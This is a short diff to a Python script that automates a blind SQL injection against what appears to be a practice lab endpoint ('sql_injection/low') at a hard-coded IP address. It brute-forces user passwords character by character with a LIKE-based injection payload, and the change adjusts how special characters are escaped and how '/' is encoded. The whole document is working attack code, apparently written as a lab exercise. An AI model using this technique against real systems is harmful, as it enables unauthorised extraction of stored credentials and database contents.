@@ -40,7 +40,7 @@ def sql():
     # TODO: Populate the user_pass_list
     # user_pass_list = [] # Where this should be a list of lists for containing the users and passwords
     # eg. [['username', 'password']]
-    special_characters = ['%', '/', '_', '#']
+    special_characters = ['%', '_', '#', '?']
 
     for i in range(1, 4):
         pwd = ''
@@ -48,7 +48,10 @@ def sql():
         while flag:
             flag = False
             for j in range(32, 127):
-                char = chr(j) if chr(j) not in special_characters else '[{}]'.format(chr(j))
+                if chr(j) == '/':
+                    char = '%2F'
+                else:
+                    char = chr(j) if chr(j) not in special_characters else '[{}]'.format(chr(j))
                 pwd_n = pwd + char
                 url = 'http://35.225.46.109/sql_injection/low/id/{}%27%20and%20password%20like%20%27{}%25%27%3B--' \
                     .format(i, pwd_n)
